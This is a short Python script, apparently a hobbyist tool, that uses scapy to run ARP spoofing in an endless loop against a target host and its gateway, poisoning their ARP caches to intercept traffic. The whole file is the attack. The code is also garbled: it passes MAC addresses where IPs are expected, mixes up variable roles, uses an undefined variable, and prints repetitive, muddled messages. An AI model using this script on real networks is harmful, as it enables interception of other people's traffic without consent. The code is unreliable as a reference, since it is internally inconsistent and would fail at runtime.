import scapy.all as scapy
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Spoofing target MAC address.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Spoofing Gateway MAC address.")
    options = parser.parse_args()
    return options

#Getting the MAC address from the IPv4 Address.
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

#Spoofing the MAC address
def spoof(target_mac, spoof_mac):
    target_ip = get_mac(target_mac)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_mac)
    scapy.send(packet, verbose=False)
    print("[+] Sent ARP packet to " + target_ip + " with MAC address " + target_mac)
    print("[+] Sent ARP packet to " + spoof_mac + " with MAC address " + spoof_mac)
    print("[+] ARP spoofing is complete." + target_ip + " and " + spoof_mac)
    print("[+] Now you can send traffic to " + target_ip + " and " + spoof_mac)
    print("[+] Now you can send traffic to " + spoof_ip + " and " + target_mac)
    print("[+] Now you can send traffic to " + target_mac + " and " + spoof_mac)
    print("[+] Now you can send traffic to " + spoof_mac + " and " + target_mac)
    

argument = get_args()
while True:
    spoof(argument.target, argument.gateway)
    spoof(argument.gateway, argument.target)

